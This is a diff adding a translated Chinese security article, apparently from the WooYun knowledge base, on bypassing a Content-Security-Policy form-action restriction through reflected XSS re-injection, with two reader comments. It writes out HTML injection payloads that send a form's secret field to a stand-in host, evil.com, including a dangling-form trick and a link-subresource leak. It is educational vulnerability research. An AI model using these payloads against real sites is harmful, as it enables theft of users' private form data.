@@ -1,0 +1,25 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">利用反射型XSS二次注入绕过CSP form-action限制</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">ca1n</a> <span class="bull">·</span> <time title="2016/04/12 13:55" ui-time="" datetime="2016/04/12 13:55" class="published ng-binding ng-isolate-scope">2016/04/12 13:55</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p>翻译: <a href="http://weibo.com/u/5824380435">SecurityToolkit</a></p><h1>0x01 简单介绍</h1><hr><p>CSP(Content-Security-Policy)是为了缓解XSS而存在的一种策略, 开发者可以设置一些规则来限制页面可以加载的内容.那文本中所说的form-action又是干啥的呢?用他可以限制form标签"action"属性的指向页面, 这样可以防止攻击者通过XSS修改表单的"action"属性,偷取用户的一些隐私信息.</p><h1>0x02 实例分析</h1><hr><p>上面讲的太抽象了, 如果不想看的话可以直接跳过....具体一点, 现在使用的是chrome浏览器, 假设下面这个secret.html是可能被XSS攻击的</p><pre><code>#!html
+//XSS在这里, victim.com/secret.html?xss=xss
+&lt;form method="POST" id='subscribe' action='oo.html'&gt;
+  &lt;input name='secret' value='xiao_mi_mi'/&gt;         //小秘密
+</code></pre><p>如果这个站点没有CSP, 攻击者可以直接通过XSS修改</p><pre><code>#!html
+&lt;form method="POST" action='http://evil.com/wo_de_mi_mi.php'&gt;   //我的秘密
+</code></pre><p>当用户傻傻地进行"正常'操作时,小秘密已经悄然变成攻击者的秘密了.然后,有一个管理员试图用CSP防止这个问题, 他使用白名单策略限制外部JS的加载并且不允许内联脚本, 好像安全性高了一点.</p><p>攻击者想了下, 把页面改成下面这个样子</p><pre><code>#!html
+&lt;div&gt;&lt;form action='http://evil.com/wo_de_mi_mi.php'&gt;&lt;/div&gt;
+&lt;form method='POST' id='subscribe' action='oo.html'&gt;
+</code></pre><p>在原本的form之前又加了一个form标签, 这个新的form标签没有闭合,并且直接碰到了老form标签, 这个时候会发生什么呢?</p><p><img alt="Screen Shot 2016-04-10 at 19.25.02" img-src="31acf41d80c908456739569042717add77e55c35.jpg"></p><p>老form标签就这样消失了! 所以攻击者再次把用户的小秘密发送到了自己的服务器上, 而且这时本来应该是POST的secret因为老form标签的消失现在变成了GET发送, 请求变成了下面这样.</p><p><img alt="Screen Shot 2016-04-10 at 19.25.02" img-src="c65741b88c40e3f46fd51d10ea419c5ebb58b6dc.jpg"></p><p>这下管理员郁闷了, 最后索性用CSP加上了form-action来白名单限定form标签的action指向, 那么这样是否还会出现问题呢?</p><p>一起来回顾一下, 现在有一个不能执行JS的反射型XSS和一个只能往白名单域名(当然没有攻击者域名...)指向的form标签.</p><p>原secret.html</p><pre><code>#!html
+// XSS位置, victim.com/secret.html?xss=xss
+&lt;form method="POST" id='subscribe' action='oo.html'&gt;
+  &lt;input name='secret' value='xiao_mi_mi'/&gt;
+</code></pre><p>最后攻击者的改过的页面如下</p><pre><code>#!html
+&lt;input value='ByPass CSP' type='submit' form='subscribe' formaction='' formmethod='GET' /&gt;
+&lt;input type='hidden' name='xss' form='subscribe' value="&lt;link rel='subresource' href='http://evil.com/wo_de_mi_mi.php'&gt;"&gt;
+// XSS, victim.com/secret.html?xss=xss
+&lt;form method="POST" id='subscribe' action='oo.html'&gt;
+  &lt;input type='hidden' name='secret' value='xiao_mi_mi'/&gt;
+&lt;/form&gt;
+</code></pre><p>这里有几处tricky的地方, 整个代码的步骤如下</p><ol><li><p>input标签的form/formmethod/formaction将老form POST到oo.html的secret变成GET发送到secret.html即当前页面.</p></li><li><p>跳转后仍处于secret.html因此该页面的XSS还可以被二次利用注入恶意标签, 这里又利用第二个input标签增加GET请求的xss参数, 所以跳转之后的URL变为</p><pre><code>#!html
+http://victim.com/secret.html?secret=xiao_mi_mi&amp;xss=&lt;link rel='subresource' href='http://evil.com/wo_de_mi_mi.php'&gt;
+</code></pre></li><li><p>此时secret.html再次触发XSS, 被攻击者加入下面标签</p><pre><code>#!html
+&lt;link rel='subresource' href='http://evil.com/wo_de_mi_mi.php'&gt;
+</code></pre></li><li><p><img alt="Screen Shot 2016-04-10 at 20.12.36" img-src="4f94dd59cdb679fb79b82d8a35e8406db5e87924.jpg"></p></li></ol><p>正是最后这个link标签泄露了本该POST发送的secret, 攻击者通过利用一个反射型XSS将CSP的form-action绕过.</p><h1>0x03 最后</h1><hr><p>CSP能够从某种程度上限制XSS, 对网站的防护是很有益义的. 不过相比国外经常能够看到相关的讨论,国内CSP的推进和热度却是比较不尽人意的, 同时关于CSP也有很多有意思的安全点, 特此翻译出来以供大家学习和参考.</p><p>原文链接: <a href="https://labs.detectify.com/2016/04/04/csp-bypassing-form-action-with-reflected-xss/">https://labs.detectify.com/2016/04/04/csp-bypassing-form-action-with-reflected-xss/</a></p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">dafeng</span> <span class="reply-time">2016-04-13 10:59:46</span></div><p></p><p>防XSS应该对输入输出检查，它这种做法本来就不合理，能绕过也是情理之中</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Feei</span> <span class="reply-time">2016-04-13 10:34:25</span></div><p></p><p>能够用CSP来防XSS from-action的也是蛮拼的，正面防护没做好在，在侧面做这么多事情。</p><p></p></div></div></div></div></div></main>
